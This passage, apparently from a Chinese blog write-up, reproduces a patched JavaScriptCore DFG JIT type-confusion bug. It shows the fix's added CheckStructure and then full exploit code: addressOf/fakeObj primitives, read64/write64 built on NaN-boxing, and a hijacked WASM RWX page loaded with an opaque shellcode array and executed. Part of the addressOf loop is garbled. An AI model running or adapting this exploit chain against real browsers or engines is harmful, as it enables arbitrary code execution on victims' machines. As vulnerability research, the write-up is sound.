double`类型，由此造成了类型混淆。  
运行结果如下，成功输出对象的地址
    root@ubuntu:~/Desktop/bug_bin# ./jsc t.js
    6.9532879215489e-310
修复漏洞以后的版本，其DFG JIT的字节码展开如下
    [10]
    CountExecution
    CreateThis
    MovHint
    [18]
    CountExecution
    JSConstant
    CheckStructure
    GetButterfly
    GetByVal
    MovHint
    ValueRep
可以看到，其在`CreateThis`后面增加了一个`CheckStructure`，从而避免了类型混淆。
###  漏洞利用
####  fakeObj和addressOf原语构造
通过上述分析，我们很容易构造出两个原语
    function addressOf(obj) {
       function foo(arg) {
          this.x = arg[0];
       }
       var handler = {
          get(target,prop) {
             if (trigger) {
                arr[0] = obj;
             }
             return target[prop];
          }
       };
       var foo_proxy = new Proxy(foo,handler);
       var arr = [1.1,2.2,3.3];
       var trigger = false;
       for (var i = 0; i  Pointer： [0000][xxxx:xxxx:xxxx]（前两个字节为0，后六个字节寻址）  
>  Double： [0001～FFFE][xxxx:xxxx:xxxx]  
>  Integer： [FFFF][0000:xxxx:xxxx]（只有低四个字节表示数字）  
>  False： [0000:0000:0000:0006]  
>  True： [0000:0000:0000:0007]  
>  Undefined： [0000:0000:0000:000a]  
>  Null： [0000:0000:0000:0002]
方式存储的，显然我们读取的数据不满足这个要求，直接使用victim.prop返回的值会导致崩溃，当我们需要读取的数据是一些地址的时候，由于地址往往就48位，因此其高2字节为0，此时这个数据会被当成一个对象地址，因此为了拿到这个值，需要加上一层`NewAddressOf`，同理，在write64的时候如果写入的数据高2字节为0，需要加上一层`NewFakeObject`，由于我们写入的是double，就不需要，但是double数据会导致第7个字节的低4位为1，因此，我们不能一次性写入8个字节的完好数据，但是我们可以保证低4字节的数据被正确写入到目标处，因此，我们只需将数据拆分为4字节一组，然后包装为8字节的double，即可依次将数据完整的写入。
####  劫持WASM，写shellcode
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    var funcObj_addr = addressOf(func);
    var codeAddr = read64(funcObj_addr[0] + 0x48,funcObj_addr[1],1);
    var rwx_addr = read64(codeAddr[0],codeAddr[1],1);
    debug("funcObj_addr=" + funcObj_addr[1].toString(16) + funcObj_addr[0].toString(16));
    debug("codeAddr=" + codeAddr[1].toString(16) + codeAddr[0].toString(16));
    debug("rwx_addr=" + rwx_addr[1].toString(16) + rwx_addr[0].toString(16));
    //替换jit的shellcode
    for (var i=0;i<shellcode.length;i++) {
       write64(rwx_addr[0] + i*4,rwx_addr[1],p64f(shellcode[i],0));
    }
    //执行shellcode
    func();
成功利用
## 0x03 感想
JSC的漏洞利用本质上与V8的漏洞利用相似，分析方法也类似，这些JS引擎的漏洞挖掘方法大多有着共同点。通过本次复现，又收获了许多新知识。
## 0x04 参考
[FireShell2020——从一道ctf题入门jsc利用](https://www.anquanke.com/post/id/223494#h3-2)  
[Webkit Exploitation
Tutorial](https://docs.ioin.in/writeup/www.auxy.xyz/_tutorial_Webkit_Exp_Tutorial_/index.html)  
[wiki JavaScriptCore](https://trac.webkit.org/wiki/JavaScriptCore#no1)  
[【编译原理】中间代码（一）](https://blog.csdn.net/jzyhywxz/article/details/78720620)  
[深入剖析 JavaScriptCore](https://ming1016.github.io/2018/04/21/deeply-analyse-javascriptcore/)  
Attacking Client-Side JIT Compilers (v2) Samuel Groß (@5aelo)  
[JavaScriptCore内部原理（一）：从JS源码到字节码的追踪](https://blog.csdn.net/systemino/article/details/110248446?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control)  
[WebKit
commitdiff](https://git.webkit.org/?p=WebKit.git;a=commitdiff;h=b602e9d167b2c53ed96a42ed3ee611d237f5461a;hp=7996e60888558ca8640cade6b1c0d6688b53ebc4)